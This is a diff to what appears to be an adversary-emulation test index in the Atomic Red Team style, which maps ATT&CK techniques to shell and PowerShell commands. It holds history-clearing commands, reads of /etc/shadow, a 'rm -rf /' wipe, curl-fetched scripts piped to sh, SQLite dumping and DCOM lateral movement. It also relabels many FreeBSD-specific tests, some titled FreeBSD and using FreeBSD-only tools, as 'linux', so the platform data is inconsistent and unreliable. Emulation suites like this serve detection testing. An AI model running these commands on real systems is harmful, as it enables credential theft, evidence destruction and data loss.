@@ -263,31 +263,31 @@ T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (r
 ",linux,macos,,"rm ~/.bash_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (rm),448893f8-1d5d-4ae2-9017-7fcd73a7e100,"Clears sh history via rm
-",freebsd,,,"rm ~/.sh_history
+",linux,,,"rm ~/.sh_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (echo),cbf506a5-dd78-43e5-be7e-a46b7c7a0a11,"Clears bash history via echo
 ",linux,,,"echo """" > ~/.bash_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (echo),a4d63cb3-9ed9-4837-9480-5bf6b09a6c96,"Clears sh history via echo
-",freebsd,,,"echo """" > ~/.sh_history
+",linux,,,"echo """" > ~/.sh_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (cat dev/null),b1251c35-dcd3-4ea1-86da-36d27b54f31f,"Clears bash history via cat /dev/null
 ",linux,macos,,"cat /dev/null > ~/.bash_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (cat dev/null),ecaefd53-6fa4-4781-ba51-d9d6fb94dbdc,"Clears sh history via cat /dev/null
-",freebsd,,,"cat /dev/null > ~/.sh_history
+",linux,,,"cat /dev/null > ~/.sh_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (ln dev/null),23d348f3-cc5c-4ba9-bd0a-ae09069f0914,"Clears bash history via a symlink to /dev/null
 ",linux,macos,,"ln -sf /dev/null ~/.bash_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (ln dev/null),3126aa7a-8768-456f-ae05-6ab2d4accfdd,"Clears sh history via a symlink to /dev/null
-",freebsd,,,"ln -sf /dev/null ~/.sh_history
+",linux,,,"ln -sf /dev/null ~/.sh_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear Bash history (truncate),47966a1d-df4f-4078-af65-db6d9aa20739,"Clears bash history via truncate
 ",linux,,,"truncate -s0 ~/.bash_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear sh history (truncate),e14d9bb0-c853-4503-aa89-739d5c0a5818,"Clears sh history via truncate
-",freebsd,,,"truncate -s0 ~/.sh_history
+",linux,,,"truncate -s0 ~/.sh_history
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear history of a bunch of shells,7e6721df-5f08-4370-9255-f06d8a77af4c,"Clears the history of a bunch of different shell types by setting the history size to zero
 ",linux,macos,,"unset HISTFILE
@@ -295,7 +295,7 @@ export HISTFILESIZE=0
 history -c
 ",sh,,,,,,
 T1070.003,Indicator Removal on Host: Clear Command History,Clear history of a bunch of shells (freebsd),9bf7c8af-5e12-42ea-bf6b-b0348fb9dfb0,"Clears the history of a bunch of different shell types by setting the history size to zero
-",freebsd,,,"unset HISTFILE
+",linux,,,"unset HISTFILE
 unset histfile
 export HISTFILESIZE=0
 export HISTSIZE=0
@@ -327,7 +327,7 @@ echo -e 'pwd101!\npwd101!' | passwd testuser1
 
 ",
 T1070.003,Indicator Removal on Host: Clear Command History,Disable sh History Logging with SSH -T (freebsd),ec3f2306-dd19-4c4b-bed7-92d20e9b1dee,"Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog
-",freebsd,,,"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
+",linux,,,"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname
 ",sh,,,"rmuser -y testuser1
 ",,"dependencies.0.description: Install sshpass and create user account used for excuting
 
@@ -396,7 +396,7 @@ when sucessfully executed, command shell  is going to display AV/Security softwa
 ",sh,,,,,,
 T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - pgrep (FreeBSD),fa96c21c-5fd6-4428-aa28-51a2fbecdbdc,"Methods to identify Security Software on an endpoint
 when sucessfully executed, command shell is going to display AV/Security software it is running.
-",freebsd,,,"pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
+",linux,,,"pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
 ",sh,,,,,,
 T1518.001,Software Discovery: Security Software Discovery,Security Software Discovery - Sysmon Service,fe613cf3-8009-4446-9a0f-bc78a15b66c9,"Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).
 
@@ -454,7 +454,7 @@ References:
 http://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/
 
 https://perishablepress.com/list-files-folders-recursively-terminal/
-",freebsd,macos,linux,"ls -a >> #{output_file}
+",linux,macos,,"ls -a >> #{output_file}
 if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;
 file */* *>> #{output_file}
 cat #{output_file} 2>/dev/null
@@ -471,7 +471,7 @@ input_arguments.output_file.default: /tmp/T1083.txt
 
 "
 T1083,File and Directory Discovery,Nix File and Directory Discovery 2,13c5e1ae-605b-46c4-a79f-db28c77ff24e,"Find or discover files on the file system
-",freebsd,macos,linux,"cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
+",linux,macos,,"cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
 if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;
 find . -type f -iname *.pdf >> #{output_file}
 cat #{output_file}
@@ -561,7 +561,7 @@ input_arguments.at_command.default: echo Hello from Atomic Red Team
 
 "
 T1053.002,Scheduled Task/Job: At,At - Schedule a job freebsd,549863fb-1c91-467e-97fc-1fa32b9f356b,"This test submits a command to be run in the future by the `at` daemon.
-",freebsd,,,"echo ""#{at_command}"" | at #{time_spec}",sh,False,,,sh,"dependencies.0.description: The `at` executable must exist in the PATH
+",linux,,,"echo ""#{at_command}"" | at #{time_spec}",sh,False,,,sh,"dependencies.0.description: The `at` executable must exist in the PATH
 
 dependencies.0.prereq_command: which at
 
@@ -873,7 +873,7 @@ input_arguments.output_file.default: /tmp/T1003.008.txt
 
 "
 T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",Access /etc/master.passwd (Local),5076874f-a8e6-4077-8ace-9e5ab54114a5,"/etc/master.passwd file is accessed in FreeBSD environments
-",freebsd,,,"sudo cat /etc/master.passwd > #{output_file}
+",linux,,,"sudo cat /etc/master.passwd > #{output_file}
 cat #{output_file}
 ",sh,True,,"rm -f #{output_file}
 ",,,"input_arguments.output_file.description: Path where captured results will be placed
@@ -884,7 +884,7 @@ input_arguments.output_file.default: /tmp/T1003.008.txt
 
 "
 T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",Access /etc/passwd (Local),60e860b6-8ae6-49db-ad07-5e73edd88f5d,"/etc/passwd file is accessed in FreeBSD and Linux environments
-",freebsd,linux,,"cat /etc/passwd > #{output_file}
+",linux,,,"cat /etc/passwd > #{output_file}
 cat #{output_file}
 ",sh,,,"rm -f #{output_file}
 ",,,"input_arguments.output_file.description: Path where captured results will be placed
@@ -895,7 +895,7 @@ input_arguments.output_file.default: /tmp/T1003.008.txt
 
 "
 T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow","Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",df1a55ae-019d-4120-bc35-94f4bc5c4b0a,"Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed
-",freebsd,linux,,"echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}
+",linux,,,"echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}
 ",sh,True,,"rm -f #{output_file}
 ",,,"input_arguments.output_file.description: Path where captured results will be placed
 
@@ -905,7 +905,7 @@ input_arguments.output_file.default: /tmp/T1003.008.txt
 
 "
 T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow","Access /etc/{shadow,passwd,master.passwd} with shell builtins",f5aa6543-6cb2-4fae-b9c2-b96e14721713,"Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins
-",freebsd,linux,,"testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
+",linux,,,"testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
 testcat /etc/passwd
 testcat /etc/master.passwd
 testcat /etc/shadow
@@ -1405,10 +1405,10 @@ input_arguments.rsp_file_path.default: PathToAtomicsFolder\T1218.008\bin\
 "
 T1496,Resource Hijacking,FreeBSD/macOS/Linux - Simulate CPU Load with Yes,904a5a0e-fb02-490d-9f8d-0e256eb37549,"This test simulates a high CPU load as you might observe during cryptojacking attacks.
 End the test by using CTRL/CMD+C to break.
-",freebsd,macos,linux,"yes > /dev/null
+",linux,macos,,"yes > /dev/null
 ",sh,,,,,,
 T1069.001,Permission Groups Discovery: Local Groups,Permission Groups Discovery (Local),952931a4-af0b-4335-bbbe-73c8c5b327ae,"Permission Groups Discovery
-",freebsd,macos,linux,"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;
+",linux,macos,,"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;
 if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi;
@@ -1489,6 +1489,41 @@ Upon successful execution, cmd will spawn calc.exe on a remote computer.
 input_arguments.computer_name.type: string
 
 input_arguments.computer_name.default: localhost
+
+"
+T1021.003,Remote Services: Distributed Component Object Model,PowerShell Lateral Movement Using Excel Application Object,505f24be-1c11-4694-b614-e01ae1cd2570,"Powershell lateral movement using the Excel COM objects.
+
+Reference:
+
+https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922
+
+Upon successful execution, cmd will spawn calc.exe on a remote computer.
+",windows,,,"copy c:\windows\system32\calc.exe 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""#{computer_name}""))
+$com.ActivateMicrosoftApp(""5"")
+",powershell,,,,,"dependencies.0.description: Microsoft Excel must be installed
+
+dependencies.0.prereq_command: try {
+  New-Object -COMObject ""Excel.Application"" | Out-Null
+  Stop-Process -Name ""Excel""
+  exit 0
+} catch { exit 1 }
+
+dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""
+
+dependencies.0.cleanup_command: Remove-Item 'C:\users\#{user}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+
+","input_arguments.computer_name.description: Hostname or IP
+
+input_arguments.computer_name.type: string
+
+input_arguments.computer_name.default: localhost
+
+input_arguments.user.description: Name of user
+
+input_arguments.user.type: string
+
+input_arguments.user.default: admin
 
 "
 T1055.003,Thread Execution Hijacking,Thread Execution Hijacking,578025d5-faa9-4f6d-8390-aae527d503e1,"This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the ""Atomic Red Team"" caption after one or two seconds. ",windows,,,"$notepad = Start-Process notepad -passthru
@@ -2158,7 +2193,7 @@ input_arguments.download.type: string
 input_arguments.download.default: https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip
 
 "
-T1176,Browser Extensions,Chrome/Chromium (Developer Mode),3ecd790d-2617-4abf-9a8c-4e8d47da9ee1,Turn on Chrome/Chromium developer mode and Load Extension found in the src directory,freebsd,linux,windows,,manual,,"1. Navigate to [chrome://extensions](chrome://extensions) and
+T1176,Browser Extensions,Chrome/Chromium (Developer Mode),3ecd790d-2617-4abf-9a8c-4e8d47da9ee1,Turn on Chrome/Chromium developer mode and Load Extension found in the src directory,linux,windows,macos,,manual,,"1. Navigate to [chrome://extensions](chrome://extensions) and
 tick 'Developer Mode'.
 
 2. Click 'Load unpacked extension...' and navigate to
@@ -2166,13 +2201,13 @@ tick 'Developer Mode'.
 
 3. Click 'Select'
 ",,,,
-T1176,Browser Extensions,Chrome/Chromium (Chrome Web Store),4c83940d-8ca5-4bb2-8100-f46dc914bc3f,"Install the ""Minimum Viable Malicious Extension"" Chrome extension",freebsd,linux,windows,,manual,,"1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend
+T1176,Browser Extensions,Chrome/Chromium (Chrome Web Store),4c83940d-8ca5-4bb2-8100-f46dc914bc3f,"Install the ""Minimum Viable Malicious Extension"" Chrome extension",linux,windows,macos,,manual,,"1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend
 in Chrome
 
 2. Click 'Add to Chrome'
 ",,,,
 T1176,Browser Extensions,Firefox,cb790029-17e6-4c43-b96f-002ce5f10938,"Create a file called test.wma, with the duration of 30 seconds
-",freebsd,linux,windows,,manual,,"1. Navigate to [about:debugging](about:debugging) and
+",linux,windows,macos,,manual,,"1. Navigate to [about:debugging](about:debugging) and
 click ""Load Temporary Add-on""
 
 2. Navigate to [manifest.json](./src/manifest.json)
@@ -2275,7 +2310,7 @@ input_arguments.interface.default: ens33
 T1040,Network Sniffing,Packet Capture FreeBSD using tshark or tcpdump,c93f2492-9ebe-44b5-8b45-36574cccfe67,"Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.
 
 Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.
-",freebsd,,,"tcpdump -c 5 -nnni #{interface}
+",linux,,,"tcpdump -c 5 -nnni #{interface}
 tshark -c 5 -i #{interface}
 ",sh,True,,,sh,"dependencies.0.description: Check if at least one of tcpdump or tshark is installed.
 
@@ -2428,7 +2463,7 @@ input_arguments.program_path.default: /tmp/t1040_macos_pcapdemo
 
 "
 T1040,Network Sniffing,Packet Capture FreeBSD using /dev/bpfN with sudo,e2028771-1bfb-48f5-b5e6-e50ee0942a14,"Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.
-",freebsd,,,"sudo #{program_path} -i #{ifname} -t 3
+",linux,,,"sudo #{program_path} -i #{ifname} -t 3
 ",sh,True,,"rm -f #{program_path}
 ",sh,"dependencies.0.description: compile C program
 
@@ -2456,7 +2491,7 @@ input_arguments.program_path.default: /tmp/t1040_freebsd_pcapdemo
 
 "
 T1040,Network Sniffing,Filtered Packet Capture FreeBSD using /dev/bpfN with sudo,a3a0d4c9-c068-4563-a08d-583bd05b884c,"Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.
-",freebsd,,,"sudo #{program_path} -f -i #{ifname} -t 3
+",linux,,,"sudo #{program_path} -f -i #{ifname} -t 3
 ",sh,True,,"rm -f #{program_path}
 ",sh,"dependencies.0.description: compile C program
 
@@ -2574,7 +2609,7 @@ input_arguments.program_path.default: /tmp/t1040_linux_pcapdemo
 
 "
 T1564.001,Hide Artifacts: Hidden Files and Directories,Create a hidden file in a hidden directory,61a782e5-9a19-40b5-8ba4-69a4b9f3d7be,"Creates a hidden file inside a hidden directory
-",freebsd,linux,macos,"mkdir /var/tmp/.hidden-directory
+",linux,macos,,"mkdir /var/tmp/.hidden-directory
 echo ""T1564.001"" > /var/tmp/.hidden-directory/.hidden-file
 ",sh,,,"rm -rf /var/tmp/.hidden-directory/
 ",,,
@@ -2691,7 +2726,7 @@ Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. R
 T1049,System Network Connections Discovery,"System Network Connections Discovery FreeBSD, Linux & MacOS",9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2,"Get a listing of network connections.
 
 Upon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.
-",freebsd,linux,macos,"netstat
+",linux,macos,,"netstat
 who -a
 ",sh,,,,sh,"dependencies.0.description: Check if netstat command exists on the machine
 
@@ -2964,7 +2999,7 @@ input_arguments.server_ip.default: 127.0.0.1
 
 "
 T1070.004,Indicator Removal on Host: File Deletion,Delete a single file - FreeBSD/Linux/macOS,562d737f-2fc6-4b09-8c2a-7f8ff0828480,"Delete a single file from the temporary directory
-",freebsd,linux,macos,"rm -f #{file_to_delete}
+",linux,macos,,"rm -f #{file_to_delete}
 ",sh,,,"rm -rf #{parent_folder}
 ",sh,"dependencies.0.description: The file must exist in order to be deleted
 
@@ -2986,7 +3021,7 @@ input_arguments.file_to_delete.default: /tmp/victim-files/T1070.004-test.txt
 
 "
 T1070.004,Indicator Removal on Host: File Deletion,Delete an entire folder - FreeBSD/Linux/macOS,a415f17e-ce8d-4ce2-a8b4-83b674e7017e,"Recursively delete the temporary directory and all files contained within it
-",freebsd,linux,macos,"rm -rf #{folder_to_delete}
+",linux,macos,,"rm -rf #{folder_to_delete}
 ",sh,,,,sh,"dependencies.0.description: The folder must exist in order to be deleted
 
 dependencies.0.prereq_command: test -e #{folder_to_delete} && exit 0 || exit 1
@@ -3075,7 +3110,7 @@ T1070.004,Indicator Removal on Host: File Deletion,Delete Filesystem - Linux,f3a
 ",linux,,,"rm -rf / --no-preserve-root > /dev/null 2> /dev/null
 ",bash,,,,,,
 T1070.004,Indicator Removal on Host: File Deletion,Delete Filesystem - FreeBSD,b5aaca7e-a48f-4f1b-8f0f-a27b8f516608,"This test deletes the entire root filesystem of a FreeBSD system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.
-",freebsd,,,"chflags -R 0 /
+",linux,,,"chflags -R 0 /
 rm -rf / > /dev/null 2> /dev/null
 ",sh,,,,,,
 T1070.004,Indicator Removal on Host: File Deletion,Delete Prefetch File,36f96049-0ad7-4a5f-8418-460acaeb92fb,"Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run ""(Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" | Measure-Object).Count""
@@ -3191,6 +3226,32 @@ input_arguments.file_extensions.description: List of file extensions to be searc
 input_arguments.file_extensions.type: string
 
 input_arguments.file_extensions.default: .doc, .docx, .txt
+
+"
+T1005,Data from Local System,Find and dump sqlite databases (Linux),00cbb875-7ae4-4cf1-b638-e543fd825300,"An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.
+",linux,,,"cd $HOME
+curl -O #{remote_url}/art
+curl -O #{remote_url}/gta.db
+curl -O #{remote_url}/sqlite_dump.sh
+chmod +x sqlite_dump.sh
+find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;
+",bash,False,,"rm -f $HOME/.art
+rm -f $HOME/gta.db
+rm -f $HOME/sqlite_dump.sh 
+",,"dependencies.0.description: Check if running on a Debian based machine.
+
+dependencies.0.prereq_command: if [ -x ""$(command -v sqlite3)"" ]; then echo ""sqlite3 is installed""; else echo ""sqlite3 is NOT installed""; exit 1; fi
+if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi
+if [ -x ""$(command -v strings)"" ]; then echo ""strings is installed""; else echo ""strings is NOT installed""; exit 1; fi
+
+dependencies.0.get_prereq_command: if grep -iq ""debian\|ubuntu\|kali\|mint"" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+if grep -iq ""rhel\|fedora\|centos"" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+
+","input_arguments.remote_url.description: url of remote payload
+
+input_arguments.remote_url.type: url
+
+input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
 
 "
 T1078.004,Valid Accounts: Cloud Accounts,Creating GCP Service Account and Service Account Key,9fdd83fd-bd53-46e5-a716-9dec89c8ae8e,"GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.
@@ -3371,7 +3432,7 @@ input_arguments.key_filename.default: rootCA.key
 
 "
 T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on FreeBSD,f4568003-1438-44ab-a234-b3252ea7e7a3,"Creates a root CA with openssl
-",freebsd,,,"openssl genrsa -out #{key_filename} 4096
+",linux,,,"openssl genrsa -out #{key_filename} 4096
 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}
 cp #{cert_filename} /usr/local/share/certs/
 certctl rehash
@@ -3558,7 +3619,7 @@ dependencies.0.get_prereq_command: Write-Host ""You will need to install Microso
 
 ",
 T1217,Browser Bookmark Discovery,List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux,3a41f169-a5ab-407f-9269-abafdb5da6c2,"Searches for Mozilla Firefox's places.sqlite file (on FreeBSD or Linux distributions) that contains bookmarks and lists any found instances to a text file.
-",freebsd,linux,,"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> #{output_file} \;
+",linux,,,"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> #{output_file} \;
 cat #{output_file} 2>/dev/null
 ",sh,,,"rm -f #{output_file} 2>/dev/null
 ",,,"input_arguments.output_file.description: Path where captured results will be placed.
@@ -3591,7 +3652,7 @@ input_arguments.output_file.default: /tmp/T1217-Chrome.txt
 
 "
 T1217,Browser Bookmark Discovery,List Google Chromium Bookmark JSON Files on FreeBSD,88ca025b-3040-44eb-9168-bd8af22b82fa,"Searches for Google Chromium's Bookmark file (on FreeBSD) that contains bookmarks in JSON format and lists any found instances to a text file.
-",freebsd,,,"find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> #{output_file} \;
+",linux,,,"find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> #{output_file} \;
 cat #{output_file} 2>/dev/null
 ",sh,,,"rm -f #{output_file} 2>/dev/null
 ",,,"input_arguments.output_file.description: Path where captured results will be placed.
@@ -4982,7 +5043,7 @@ Upon successful execution, cmd.exe will execute arp to list out the arp cache. O
 T1018,Remote System Discovery,Remote System Discovery - arp nix,acb6b1ff-e2ad-4d64-806c-6c35fe73b951,"Identify remote systems via arp.
 
 Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
-",freebsd,linux,macos,"arp -a | grep -v '^?'
+",linux,macos,,"arp -a | grep -v '^?'
 ",sh,,,,sh,"dependencies.0.description: Check if arp command exists on the machine
 
 dependencies.0.prereq_command: if [ -x ""$(command -v arp)"" ]; then exit 0; else exit 1; fi;
@@ -4993,7 +5054,7 @@ dependencies.0.get_prereq_command: (which yum && yum -y install net-tools)||(whi
 T1018,Remote System Discovery,Remote System Discovery - sweep,96db2632-8417-4dbb-b8bb-a8b92ba391de,"Identify remote systems via ping sweep.
 
 Upon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.
-",freebsd,linux,macos,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip UP"" || : ; done
+",linux,macos,,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip UP"" || : ; done
 ",sh,,,,,,"input_arguments.start_host.description: Subnet used for ping sweep.
 
 input_arguments.start_host.type: string
@@ -5105,7 +5166,7 @@ dependencies.0.get_prereq_command: apt-get install iproute2 -y
 
 ",
 T1018,Remote System Discovery,Remote System Discovery - netstat,d2791d72-b67f-4615-814f-ec824a91f514,"Use the netstat command to display the kernels routing tables.
-",freebsd,,,"netstat -r | grep default
+",linux,,,"netstat -r | grep default
 ",sh,,,,,,
 T1018,Remote System Discovery,Remote System Discovery - ip tcp_metrics,6c2da894-0b57-43cb-87af-46ea3b501388,"Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. 
 ",linux,,,"ip tcp_metrics show |grep --invert-match ""^127\.""
@@ -5329,7 +5390,7 @@ input_arguments.executable.default: C:\Windows\System32\calc.exe
 
 "
 T1140,Deobfuscate/Decode Files or Information,Base64 decoding with Python,356dc0e8-684f-4428-bb94-9313998ad608,"Use Python to decode a base64-encoded text string and echo it to the console
-",freebsd,linux,macos,"ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())')
+",linux,macos,,"ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())')
 python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""
 python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""
 python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""
@@ -5356,7 +5417,7 @@ input_arguments.encoded_file.default: /tmp/T1140.encoded
 
 "
 T1140,Deobfuscate/Decode Files or Information,Base64 decoding with Perl,6604d964-b9f6-4d4b-8ce8-499829a14d0a,"Use Perl to decode a base64-encoded text string and echo it to the console    
-",freebsd,linux,macos,"ENCODED=$(perl -e ""use MIME::Base64;print(encode_base64('#{message}'));"")
+",linux,macos,,"ENCODED=$(perl -e ""use MIME::Base64;print(encode_base64('#{message}'));"")
 perl -le ""use MIME::Base64;print(decode_base64('$ENCODED'));""
 echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
 echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'
@@ -5403,7 +5464,7 @@ input_arguments.encoded_file.default: /tmp/T1140.encoded
 
 "
 T1140,Deobfuscate/Decode Files or Information,Base64 decoding with shell utilities (freebsd),b6097712-c42e-4174-b8f2-4b1e1a5bbb3d,"Use common shell utilities to decode a base64-encoded text string and echo it to the console
-",freebsd,,,"ENCODED=$(echo '#{message}' | b64encode -r -)
+",linux,,,"ENCODED=$(echo '#{message}' | b64encode -r -)
 printf $ENCODED | b64decode -r
 echo $ENCODED | b64decode -r
 echo $(echo $ENCODED) | b64decode -r
@@ -5425,7 +5486,7 @@ input_arguments.encoded_file.default: /tmp/T1140.encoded
 
 "
 T1140,Deobfuscate/Decode Files or Information,FreeBSD b64encode Shebang in CLI,18ee2002-66e8-4518-87c5-c0ec9c8299ac,"Using b64decode shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. 
-",freebsd,,,"echo #{bash_encoded} | b64decode -r | sh
+",linux,,,"echo #{bash_encoded} | b64decode -r | sh
 echo #{dash_encoded} | b64decode -r | sh
 echo #{fish_encoded} | b64decode -r | sh
 echo #{sh_encoded} | b64decode -r | sh
@@ -5461,7 +5522,7 @@ input_arguments.sh_encoded.default: IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1
 
 "
 T1140,Deobfuscate/Decode Files or Information,Hex decoding with shell utilities,005943f9-8dd5-4349-8b46-0313c0a9f973,"Use common shell utilities to decode a hex-encoded text string and echo it to the console
-",freebsd,linux,macos,"ENCODED=$(echo '#{message}' | xxd -ps -c 256)
+",linux,macos,,"ENCODED=$(echo '#{message}' | xxd -ps -c 256)
 printf $ENCODED | xxd -r -p
 echo $ENCODED | xxd -r -p
 echo $(echo $ENCODED) | xxd -r -p
@@ -6037,7 +6098,7 @@ input_arguments.domain.default: google.com
 
 "
 T1571,Non-Standard Port,Testing usage of uncommonly used port,5db21e1d-dd9c-4a50-b885-b1e748912767,"Testing uncommonly used port utilizing telnet.
-",freebsd,linux,macos,"echo quit | telnet #{domain} #{port}
+",linux,macos,,"echo quit | telnet #{domain} #{port}
 exit 0
 ",sh,,,,sh,"dependencies.0.description: Requires telnet
 
@@ -7966,7 +8027,7 @@ input_arguments.output_file.default: /tmp/T1074.001_discovery.log
 
 "
 T1074.001,Data Staged: Local Data Staging,Stage data from Discovery.sh (freebsd),4fca7b49-379d-4493-8890-d6297750fa46,"Utilize curl to download discovery.sh and execute a basic information gathering shell script
-",freebsd,,,"curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
+",linux,,,"curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
 ",sh,,,,sh,"dependencies.0.description: Check if curl is installed.
 
 dependencies.0.prereq_command: if [ ! -x ""$(command -v curl)"" ]; then exit 1; else exit 0; fi;
@@ -8012,7 +8073,7 @@ dependencies.1.get_prereq_command: sudo systemctl start docker
 
 ",
 T1070.006,Indicator Removal on Host: Timestomp,Set a file's access timestamp,5f9113d5-ed75-47ed-ba23-ea3573d05810,"Stomps on the access timestamp of a file
-",freebsd,linux,macos,"touch -a -t 197001010000.00 #{target_filename}
+",linux,macos,,"touch -a -t 197001010000.00 #{target_filename}
 ",sh,,,"rm -f #{target_filename}
